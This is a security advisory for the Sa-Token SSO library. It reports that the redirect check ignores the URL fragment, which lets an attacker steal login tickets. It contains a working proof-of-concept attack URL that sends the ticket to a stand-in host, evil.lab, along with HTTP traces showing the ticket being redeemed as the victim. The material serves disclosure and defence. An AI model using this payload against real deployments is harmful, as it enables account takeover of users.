# SA-TOKEN-2026-02: SSO redirect check ignores the URL fragment, so the login ticket can be sent to an attacker page

- Product: dromara/Sa-Token (https://github.com/dromara/Sa-Token)
- Reporter: thientc (VinSOC)
- Vendor status: reported 2026-11-17 through GitHub private vulnerability reporting, [GHSA-g2m5-xwp5-ch3w](https://github.com/dromara/Sa-Token/security/advisories/GHSA-g2m5-xwp5-ch3w); in triage, no maintainer reply as of 2026-11-22
- CVE: requested from MITRE on 2026-11-22, pending

## Summary

`/sso/auth` checks the `redirect` URL against the client's allow-url only up to the first `?`. If the redirect contains a `#` after the query, the check still passes, and `joinParam` appends `&ticket=...` after the `#`. The client's `/sso/login` then redirects to its `back` parameter without validating it. The browser keeps the fragment, so the ticket ends up in `location.hash` on a page the attacker controls.

The attacker redeems the ticket at the client and is logged in there as the victim. This works with an exact allow-url, which the docs recommend for production (`sso-check-domain.md`).

## Details

I tested v1.46.0 (`ae58d1cc`). All paths are under `sa-token-plugin/sa-token-sso/src/main/java/cn/dev33/satoken/sso/`.

- **`SaSsoServerTemplate.checkRedirectUrl`:**
  - It cuts the URL at the first `?` (`template/SaSsoServerTemplate.java:435-438`).
  - The `@` check (`:441`) and the allow-list match (`:469`) only see the part before `?`, so they pass for `http://client.lab:18994/sso/login`.
- **`encodeBackParam`** (`:409-411`): a `back` value that is already URL-encoded is returned unchanged. A literal `#x` after it survives.
- **`buildRedirectUrl`** (`:384`) calls `SaFoxUtil.joinParam`, which appends `&ticket=T` to the end of the string, after the fragment (`sa-token-core/.../util/SaFoxUtil.java:433-446`).
- **Client side:**
  - The browser does not send the fragment, so the client receives no ticket.
  - Because the user is already logged in, `processor/SaSsoClientProcessor.java:206-210` runs `res.redirect(back)` without any check.
  - The redirect `Location` has no fragment, so the browser carries `#x&ticket=T` over to the new URL.
- **The victim only needs a session at the SSO server.** The attacker can wrap the same link as `back` of the client's own `/sso/login`. The client then does a normal ticket login, which creates the client session. After that, `_loginByTicket` redirects into the attack URL without checking `back` (`SaSsoClientProcessor.java:237,253`).

The `@` ban next to this code was added for the same kind of ticket hijack. This looks like a sibling of that fix.

## PoC

Local lab only: SSO server and client on Spring Boot 3.5.16 with sa-token-sso 1.46.0 built from the tag, test accounts, and a mock attacker page. Both apps use the stock `dister()` processors.

Server config: `sa-token.sso-server.clients.sso-client3.allow-url=http://client.lab:18994/sso/login` (exact, no wildcard).

The victim, logged in at the server and the client, opens:

```
http://server.lab:18993/sso/auth?client=sso-client3&redirect=http%3A%2F%2Fclient.lab%3A18994%2Fsso%2Flogin%3Fback%3Dhttp%253A%252F%252Fevil.lab%253A18995%252F%23x
```

```
302 Location: http://client.lab:18994/sso/login?back=http%3A%2F%2Fevil.lab%3A18995%2F#x&ticket=QXqAsw...
GET /sso/login?back=http%3A%2F%2Fevil.lab%3A18995%2F       (fragment not sent)
302 Location: http://evil.lab:18995/
final URL in Chromium: http://evil.lab:18995/#x&ticket=QXqAsw...
```

The attacker page reads `location.hash`. Then, from a fresh browser context with no cookies:

```
GET http://client.lab:18994/sso/login?ticket=QXqAsw...   -> 302, Set-Cookie: satoken=...
GET http://client.lab:18994/whoami                        -> login=true id=10001   (the victim)
```

The one-link variant, for a victim logged in at the server only:

```
http://client.lab:18994/sso/login?back=<URL-encoded /sso/auth link above>
```

It gives the same result. I ran both in headless Chromium 140, starting the navigation from a page on the attacker's origin. The server cookie (no SameSite attribute, so Lax by default) is sent on these top-level GETs.

Things that behave as expected:

- With `%23` instead of `#`, the ticket stays in the query.
- A redirect outside the allow-list gives 30002.
- A ticket can only be used once.

## Impact

Anyone who can get a user who is logged in at the SSO server to open one link (or visit one page) gets a session on the SSO client as that user. The attacker needs no account. A wildcard allow-url such as `http://client/sso/*` behaves the same. The ticket lives 300 s, so the victim has to open the link within that time.

Suggested fix: reject redirects that contain `#`, or parse the URL and compare scheme, host, port and path exactly before appending the ticket. Make `joinParam` insert parameters before a fragment. On the client, validate `back` before `res.redirect(back)`.

## Affected versions

- Tested and affected: 1.46.0 (`ae58d1cc`), package `cn.dev33:sa-token-sso`, ticket mode with an exact or trailing-wildcard client allow-url and the default `SaSsoClientProcessor`.
- Fixed in: no fixed release known.

Tested on a local Spring Boot lab with synthetic accounts and data only; no live deployment was tested. Version tested: 1.46.0.

## Severity

CVSS 3.1 base score **8.1** (High): `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

- **AV:N** Delivered as a web link.
- **AC:L** The docs-recommended exact allow-url is enough; the one-link variant needs only a session at the SSO server.
- **PR:N** The attacker has no account.
- **UI:R** The victim opens one link or visits one attacker page.
- **S:U** The impact is on the client app protected by the same SSO.
- **C:H** The attacker gets a session as the victim.
- **I:H** The attacker can act as the victim in the client.
- **A:N** No availability effect.

## Credit

thientc (VinSOC)
